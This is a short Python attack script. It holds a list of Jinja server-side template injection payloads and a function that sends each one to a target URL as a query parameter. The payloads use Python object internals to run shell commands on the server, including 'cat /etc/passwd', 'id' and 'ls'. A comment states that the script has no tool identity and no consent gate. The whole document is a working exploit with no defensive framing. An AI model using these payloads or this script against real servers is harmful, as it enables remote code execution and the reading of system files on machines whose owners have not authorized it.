#!/usr/bin/env python3
# Payload table with no tool identity, no consent gate.
PAYLOADS = {
    "jinja": [
        "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
    ],
}

def send(target: str) -> None:
    import urllib.request
    for payload in PAYLOADS["jinja"]:
        urllib.request.urlopen(target + "?q=" + payload)
